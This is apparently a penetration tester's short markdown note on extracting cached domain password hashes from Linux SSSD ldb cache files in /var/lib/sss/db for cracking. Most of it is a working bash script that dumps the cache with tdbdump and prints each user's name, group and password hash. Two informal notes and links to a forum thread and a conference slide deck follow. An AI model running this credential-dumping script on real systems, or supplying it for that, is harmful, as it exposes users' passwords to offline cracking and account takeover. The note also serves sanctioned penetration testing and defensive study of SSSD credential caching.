## Obtain Hash from SSSD cache file (ldb format) and crack
1. Discover cached file in /var/lib/sss/db
2. Extract hash from it
```
#!/bin/bash

database="<path to local ldb file>"

for users in `tdbdump $database | grep cachedPassword | cut -d "=" -f 3 | cut -d "," -f 1`
do
	name=`tdbdump $database | grep cachedPassword | grep $users | cut -d "=" -f 7 | cut -d "," -f 1`
	group=`tdbdump $database | grep cachedPassword | grep $users | cut -d "=" -f 13 | cut -d "," -f 1`
	hash="`tdbdump $database | grep cachedPassword | cut -f 2-4 -d '$' |cut -f 1 -d '\\' |sed 's/^/$/g'`"
	echo "$users : $group : $name : $hash"
done
```
Note: It's likely a metasploit module handles this just ran out of time on the box I was messing with to test it
Note: Each domain has it's own cache

## Resources
https://forums.fedoraforum.org/showthread.php?258958-sssd-cache ***Used as the base cached file bash script (sgallah comment)
https://i.blackhat.com/eu-18/Wed-Dec-5/eu-18-Wadhwa-Brown-Where-2-Worlds-Collide-Bringing-Mimikatz-et-al-to-UNIX.pdf ***slide 37 for grep string on bash script

